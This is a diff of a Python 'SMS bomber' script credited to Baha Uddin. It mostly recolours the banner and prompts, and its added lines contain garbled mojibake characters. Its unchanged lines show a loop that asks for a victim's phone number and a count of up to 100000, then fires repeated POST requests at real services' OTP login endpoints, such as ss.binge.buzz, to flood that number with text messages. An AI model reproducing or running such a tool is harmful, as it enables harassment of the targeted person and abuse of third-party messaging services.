@@ -46,7 +46,7 @@ end = '\033[0m'
 
 purple="\033[0;35m"
 
-logo=(green+red+""" 
+logo=(cyan+""" 
 
 
 
@@ -71,12 +71,12 @@ logo=(green+red+"""
 
 
 
-line=(yellow+"======================================================")
+line=(blue+"======================================================")
 tversion=(cyan+"\t\t   Version : 1.0.1 ")
 
 line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
  
-dtls=(yellow+"\t\t Created By: Baha Uddin ")
+dtls=(color_off+"\t\t Created By: Baha Uddin ")
 
 note=(cyan+"Note: Assalamo alikom kemon asen sobai.")
 
@@ -100,8 +100,8 @@ print(line)
 
 print(' ')
 
-number=str(input(red+"[➙] Enter Your Number : "))
-amount=int(input(cyan+"[➙] Enter The Amount (100000): "))
+number=str(input(white+"[âž™] Enter Your Number : "))
+amount=int(input(cyan+"[âž™] Enter The Amount (100000): "))
 
 url1 = "https://ss.binge.buzz/otp/send/login"
 
@@ -148,9 +148,9 @@ for i in range (amount):
 	resp4 = requests.post(url4, headers=headers4,data=data4)
 	resp5 = requests.post(url5, headers=headers5, data=data5)
 	resp = requests.post(url6, headers=headers6, data=data6)	
-	print(str(i+1)+green+'.	➙SMS Sent Mother-Fucker  😈✅')
+	print(str(i+1)+lightblue+'.	âž™SMS Sent Mother-Fucker  ðŸ˜ˆâœ…')
 	
 print('					')
-print(cyan+'\t\tThanks For Using BOMBER BAHA UDDIN')
+print(on_green+'\t\tThanks For Using BOMBER BAHA UDDIN')
 
 
